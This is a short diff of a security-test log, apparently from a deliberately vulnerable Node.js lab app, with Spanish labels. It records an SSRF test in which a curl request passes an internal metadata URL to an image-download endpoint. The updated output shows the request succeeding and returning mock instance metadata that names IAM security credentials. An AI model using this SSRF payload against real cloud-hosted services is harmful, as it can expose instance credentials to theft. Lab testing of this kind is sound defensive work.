@@ -1,6 +1,6 @@
 === A10 - SSRF a metadatos internos ===
 Comando: curl -X POST http://localhost:3000/imagenes/descargar -H Content-Type: application/json -d {"url": "http://127.0.0.1:9999/latest/meta-data/"}
 --- Respuesta ---
-{"error":"Error interno","stack":"FetchError: request to http://127.0.0.1:9999/latest/meta-data/ failed, reason: connect ECONNREFUSED 127.0.0.1:9999\n    at ClientRequest.<anonymous> (C:\\Users\\david\\downloads\\propnet\\src\\vulnerable\\node_modules\\node-fetch\\lib\\index.js:1461:11)\n    at ClientRequest.emit (node:events:518:28)\n    at emitErrorEvent (node:_http_client:104:11)\n    at Socket.socketErrorListener (node:_http_client:518:5)\n    at Socket.emit (node:events:518:28)\n    at emitErrorNT (node:internal/streams/destroy:170:8)\n    at emitErrorCloseNT (node:internal/streams/destroy:129:3)\n    at process.processTicksAndRejections (node:internal/process/task_queues:90:21)"}
-HTTP_STATUS:500
+{"mensaje":"Descarga completada","url":"http://127.0.0.1:9999/latest/meta-data/","contenido_parcial":"{\"iam/security-credentials\":\"propnet-role\",\"instance-id\":\"i-0demo1234567890\",\"local-ipv4\":\"127.0.0.1\"}"}
+HTTP_STATUS:200
 
